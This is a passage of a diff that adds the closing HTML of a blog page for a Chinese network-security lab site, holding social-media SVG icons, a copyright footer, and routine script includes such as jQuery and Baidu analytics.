+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
